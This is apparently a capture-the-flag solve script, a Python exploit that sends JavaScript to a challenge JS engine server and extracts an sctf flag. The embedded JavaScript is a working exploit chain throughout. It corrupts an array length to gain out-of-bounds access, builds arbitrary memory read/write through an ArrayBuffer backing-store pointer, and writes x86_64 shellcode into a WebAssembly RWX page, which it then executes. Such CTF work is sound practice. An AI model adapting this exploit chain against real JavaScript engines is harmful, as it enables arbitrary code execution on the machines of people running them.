#!/usr/bin/env python3
import os
import re
import socket
import subprocess
import sys
import time

HOST = os.environ.get('HOST', 'chal.sieberr.live')
PORT = int(os.environ.get('PORT', '21007'))
DIST = os.environ.get('DIST', '.')
LOCAL = os.environ.get('LOCAL', '') not in ('', '0', 'false', 'False')

JS = r'''
let B=new ArrayBuffer(8),F=new Float64Array(B),U=new BigUint64Array(B);
function ftoi(x){F[0]=x;return U[0]}
function itof(x){U[0]=x;return F[0]}

let oob=[1.1,2.2,3.3];
let keep=[{}, {}, {}, {}];
let ab=new ArrayBuffer(0x200);
let dv=new DataView(ab);

let wc=new Uint8Array([
  0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,
  7,7,1,3,102,111,111,0,0,10,6,1,4,0,65,42,11
]);
let wm=new WebAssembly.Module(wc);
let wi=new WebAssembly.Instance(wm);
let wf=wi.exports.foo;

// Flip one bit in JSArray length: 3 -> 0x400003
rowhammer(oob,14,7);

// Rebuild backing_store pointer for the ArrayBuffer from OOB slots.
let meta=ftoi(oob[35])&0xffffffff00000000n;
function setp(p){
  oob[34]=itof((p&0xffffffffn)<<32n);
  oob[35]=itof(meta|(p>>32n));
}
function r64(a){setp(a);return dv.getBigUint64(0,true)}
function w64(a,v){setp(a);dv.setBigUint64(0,v,true)}
function w8(a,v){setp(a);dv.setUint8(0,v)}

// Native module and RWX page leak.
let abp=((ftoi(oob[35])&0xffffffffn)<<32n)|(ftoi(oob[34])>>32n);
let nm=(abp&0xffff00000000n)+0x10400n;
let cm=r64(nm+0xc0n);
let rwx=r64(cm+8n);

// x86_64 shellcode that opens flag.txt, reads, and writes to stdout.
// Packed as qwords/bytes to keep the JS short enough for the challenge limit.
let chunks=[
  [0,  7020098860837163569n,8],
  [8,  9892245042686602855n,8],
  [16,  364606862247997927n,8],
  [24,16611888414798858391n,8],
  [32,14017740880374497202n,8],
  [40,  364606857943122282n,8],
  [48, 1208234947446604616n,8],
  [56,                  195n,1]
];
for(let c of chunks){
  if(c[2]==8){
    w64(rwx+BigInt(c[0]),c[1]);
  }else{
    let v=c[1];
    for(let j=0;j<c[2];j++){
      w8(rwx+BigInt(c[0]+j), Number((v>>(8n*BigInt(j)))&255n));
    }
  }
}
wf();
'''.strip()


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 10.0) -> bytes:
    sock.settimeout(timeout)
    data = b''
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def run_remote() -> bytes:
    payload = JS.encode()
    if len(payload) > 15000:
        raise RuntimeError(f'payload too large: {len(payload)}')
    with socket.create_connection((HOST, PORT), timeout=10.0) as s:
        recv_until(s, b'Script length:')
        s.sendall(str(len(payload)).encode() + b'\n')
        recv_until(s, b'Enter script:')
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)
        s.settimeout(12.0)
        out = b''
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk
        return out


def run_local() -> bytes:
    payload = JS.encode()
    proc = subprocess.run(
        [sys.executable, 'server.py'],
        cwd=DIST,
        input=str(len(payload)).encode() + b'\n' + payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=20,
    )
    if proc.stderr:
        sys.stderr.buffer.write(proc.stderr)
        sys.stderr.flush()
    return proc.stdout


def main() -> None:
    for attempt in range(1, 8):
        try:
            out = run_local() if LOCAL else run_remote()
        except Exception as e:
            print(f'[-] attempt {attempt}: {e}', file=sys.stderr)
            time.sleep(0.2)
            continue

        text = out.decode('latin-1', 'replace')
        m = re.search(r'sctf\{[^}\n\r]+\}', text)
        if m:
            print(m.group(0))
            return

        print(f'[-] attempt {attempt} no flag, raw output below:', file=sys.stderr)
        sys.stderr.write(text + ('\n' if not text.endswith('\n') else ''))
        sys.stderr.flush()
        time.sleep(0.2)

    raise SystemExit('failed to get flag')


if __name__ == '__main__':
    main()
